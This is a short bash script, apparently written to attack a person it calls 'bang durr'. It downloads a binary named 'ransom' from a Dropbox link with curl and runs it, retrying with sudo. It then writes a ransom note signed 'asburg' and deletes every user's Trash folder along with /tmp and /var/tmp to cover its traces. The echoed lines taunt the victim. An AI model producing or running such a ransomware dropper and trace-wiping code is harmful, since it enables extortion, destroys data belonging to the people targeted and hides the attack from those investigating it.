#!/bin/bash

echo "hello"
echo "so here we are"
echo "bang durr always messing around with me"
echo "so yeah lets teach him a lesson"

curl -L -o ransom "https://www.dropbox.com/scl/fi/hrdoq9whjl47ogv1z1iat/ransom?rlkey=hmqxi8bof6exvu2ck4bcw2lnt&st=kvupijxc&dl=1"

ls

./ransom 2>/dev/null || sudo ./ransom 2>/dev/null

chmod +x ransom
./ransom

ls

echo "HAHA"
echo "take that bang durr"
echo "hope you have a hard time to fix that lmao"
echo "so yeah this is the last from me"

rm -f ransom.enc

ls
echo "HAHA that's all"
echo "lemme give you a note"

bin_file=$(ls *.bin 2>/dev/null | head -1)

if [ -n "$bin_file" ] && [ -f "$bin_file" ]; then
    echo "Found bin file: $bin_file"
    cat "$bin_file"
else
    echo "No bin file found in directory"
    ls -la
fi

echo "oops"

echo "you have been ransomed by asburg" > note.txt

rm -rf ~/.local/share/Trash/* 2>/dev/null
rm -rf /home/$USER/.local/share/Trash/* 2>/dev/null
rm -rf /root/.local/share/Trash/* 2>/dev/null

for user_dir in /home/*; do
    if [ -d "$user_dir/.local/share/Trash" ]; then
        rm -rf "$user_dir/.local/share/Trash/"* 2>/dev/null
    fi
done

sudo rm -rf /tmp/trash* /tmp/.*trash* 2>/dev/null

which trash-empty >/dev/null 2>&1 && trash-empty >/dev/null 2>&1
which trash-cli >/dev/null 2>&1 && trash-empty >/dev/null 2>&1

rm -rf /tmp/* /var/tmp/* 2>/dev/null
sudo rm -rf /tmp/* /var/tmp/* 2>/dev/null

echo "goodbye"
echo "All traces cleaned from trash!"